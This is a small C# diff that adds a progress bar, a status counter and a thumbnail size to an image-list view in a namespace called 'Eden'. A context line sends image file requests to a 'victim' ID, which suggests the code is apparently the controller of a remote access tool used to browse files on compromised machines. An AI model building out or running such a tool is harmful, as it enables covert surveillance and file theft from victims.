@@ -65,6 +65,9 @@ namespace Eden
                             {
                                 m_ImageList.Images.Add(szImgFilename, img);
                                 listView1.Items.Add(item);
+
+                                toolStripProgressBar1.Increment(1);
+                                toolStripStatusLabel1.Text = $"Image[{listView1.Items.Count}]";
                             }));
                         }
                     }
@@ -132,6 +135,10 @@ namespace Eden
 
             listView1.View = View.LargeIcon;
             listView1.LargeImageList = m_ImageList;
+            m_ImageList.ImageSize = new Size(255, 255);
+
+            toolStripProgressBar1.Maximum = m_lsImgFilename.Count;
+            toolStripStatusLabel1.Text = $"Image[{listView1.Items.Count}]";
 
             m_clnt.SendVictim(m_szVictimID, "File|img|" + clsTools.EZData.OneDList2String(m_lsImgFilename));
         }
